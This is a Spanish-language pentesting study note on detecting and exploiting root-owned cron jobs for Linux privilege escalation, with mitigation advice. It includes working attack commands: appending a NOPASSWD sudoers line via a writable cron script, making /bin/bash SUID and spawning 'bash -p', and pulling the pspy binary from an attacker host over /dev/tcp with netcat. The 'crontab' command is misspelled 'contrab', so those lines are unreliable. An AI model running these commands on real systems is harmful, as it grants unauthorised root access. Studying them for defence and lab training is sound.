# Detección y explotación de tareas Cron

Tags: #Linux #CRON  #Escalada #Root #Privilegios #PSPY 

Una tarea **cron** es una tarea programada en sistemas Unix/Linux que se ejecuta en un momento determinado o en intervalos regulares de tiempo. Estas tareas se definen en un archivo **crontab** que especifica qué comandos deben ejecutarse y cuándo deben ejecutarse.

La detección y explotación de tareas cron es una técnica utilizada por los atacantes para elevar su nivel de acceso en un sistema comprometido. Por ejemplo, si un atacante detecta que un archivo está siendo ejecutado por el usuario “root” a través de una tarea cron que se ejecuta a intervalos regulares de tiempo, y se da cuenta de que los permisos definidos en el archivo están mal configurados, podría manipular el contenido del mismo para incluir instrucciones maliciosas las cuales serían ejecutadas de forma privilegiada como el usuario ‘root’, dado que corresponde al usuario que está ejecutando dicho archivo.

Ahora bien, para detectar tareas cron, los atacantes pueden utilizar herramientas como **Pspy**. Pspy es una herramienta de línea de comandos que monitorea las tareas que se ejecutan en segundo plano en un sistema Unix/Linux y muestra las nuevas tareas que se inician.

Con el objetivo de reducir las posibilidades de que un atacante lograra explotar las tareas cron en un sistema, se recomienda llevar a cabo alguno de los siguientes puntos:

```bash 
- Limitar el número de tareas cron: es importante limitar el número de tareas cron que se ejecutan en el sistema y asegurarse de que solo se otorgan permisos a tareas que requieren permisos especiales para funcionar correctamente. Esto disminuye la superficie de ataque y reduce las posibilidades de que un atacante pueda encontrar una tarea cron vulnerable.
- Verificar los permisos de las tareas cron: es importante revisar los permisos de las tareas cron para asegurarse de que solo se otorgan permisos a usuarios y grupos autorizados. Además, se recomienda evitar otorgar permisos de superusuario a las tareas cron, a menos que sea estrictamente necesario.
- Supervisar regularmente el sistema: es importante monitorear regularmente el sistema para detectar cambios inesperados en las tareas cron y para buscar posibles brechas de seguridad. Además, se recomienda utilizar herramientas de monitoreo de seguridad para detectar actividades sospechosas en el sistema.
- Configurar los registros de la tarea cron: se recomienda habilitar la opción de registro para las tareas cron, para poder identificar cualquier actividad sospechosa en las tareas definidas y para poder llevar un registro de las actividades realizadas por cada una de estas.
```

A continuación, se comparte el enlace al proyecto de Github correspondiente a la herramienta Pspy:
- [Pspy](https://github.com/DominicBreuker/pspy)

## CRON

```bash 
# Las tareas CRON son tareas que se ejecutan en el sistema a intervalos regulares de tiempo. Debemos de fijarnos solo en las tareas creadas por el usuario 'root'

❯ contrab -e       # Para definir una tarea CRON
❯ contrab -l       # Listas las tareas CRON del usuario
```

```bash
❯ grep -rnw /usr -e "/home/<user>/<file>"         # Lo debemos de hacer desde la raiz y asi podemos ver donde mas se encuentra el archivo 
```

```bash 
Si no tenemos un editor de texto, podemos hacer lo siguiente, donde haremos que el usuario tenga todos los privilegios sin passwd y lo colocaremos dentro del archivo que tiene la tarea CRON 'bin.sh'

❯ printf '#!/bin/bash\necho "<username> ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/bin.sh

	# \n = Salto de linea 

❯ sudo su                       # Cambiamos al usuario root sin proporcionar passwd
```
   
```bash 
# Podemos crearnos un Script llamado 'procmon.sh', le damos privilegios de ejecución para ver las tareas que se están ejecutando, poder ver los procesos nuevos y antiguos. También podemos ver que  tipo de comandos se están ejecutando y ver cual proceso nos puede ayudar a escalar privilegios. 

El archivo que necesitamos es el que lo esta ejecutando como root, además de que otros usuarios lo puedan modificar.

#!/bin/bash
	
function ctrl_c(){
	echo -e "\\n[!] Saliendo \\n"
	tput cnorm; exit 1
}
	
# Ctrl + c
trap ctrl_c INT
tput civis
old_process="$(ps -eo command)"

while true; do
	new_process="$(ps -eo command)"
	diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -vE "command|procmon|kworker"
	old_process=$new_process
done	
```

```bash 
# Podemos modificar el binario que tiene una tarea CRON y hacer una bash SUID.

❯ chmod u+s /bin/bash              # Haremos que la bash sea SUID
```

```bash 
❯ watch -n 1 ls -l /bin/bash       # Miraremos cada seg. el permiso de /bin/bash

	# n = Tiempo de actualizacion de 1 seg 
```

```bash 
❯ bash -p                          # Nos lanzamos la bash privilegiada, despues de convertirla SUID
```

```bash 
# También podemos usar PSPY para ver las tareas CRON. 
# En releases nos descargamos el binario .sh  > **pspy64**
# Para transferir el PSPY podemos usar la ruta '/dev/tcp' y después de transferirlo le damos permisos de ejecución. 

❯ nc -nlvp 443 < pspy64                       # Colocaremos este comando en la maquina de atacante 
❯ cat < /dev/tcp/192.168.68.1/443 > pspy      # Leeremos con cat lo que se esta compartiendo por el puerto 443 y ese output meterlo como input a pspy en la maquina victima
❯ md5sum pspy                                 # Para verificar si el binario se ha transferido correctamente, el md5 que obtenemos en la maquina victima del pspy64 debe de ser igual al de la maquina de atacante 
```
